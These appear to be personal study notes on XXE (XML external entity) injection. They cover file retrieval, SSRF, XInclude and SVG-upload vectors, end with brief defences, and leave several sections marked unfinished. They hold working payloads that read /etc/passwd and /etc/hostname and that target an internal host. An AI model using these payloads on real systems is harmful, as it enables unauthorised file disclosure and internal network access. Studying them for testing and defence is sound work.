# XXE (XML external entity)

### What is XML

* Some applications use the XML format to transmit data between the browser and the server.
* Its popularity has now declined in favor of the JSON format

## Impact

* Retrieve files
* Perform SSRF attacks

## Exploiting XXE to retrieve files

1. Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file
2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

* Note: To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck> 
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## Exploiting XXE to perform SSRF attacks

* Reflected SSRF
* Bind SSRF

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## Blind XXE

* to do

## Finding hidden attack surface for XXE injection

* Requests that contain data in XML format
* Requests that do not contain any XML
  * (A way to detect) It's useful add entity reference that doesn't exist to cause an error condition -> ok it's XML ...
  * XInclude attacks
    * Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document
    * XInclude is a part of the XML specification that allows an XML document to be built from sub-documents
    * ```
      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/></foo>
      ```
  * Via file upload
    * Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG
    * `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
      * This works if it's used image processing library & support SVG images & allow external entity
  * Via modified content type
    * To do

## Defence

* Disable resolution of external entities
* Disable support for XInclude
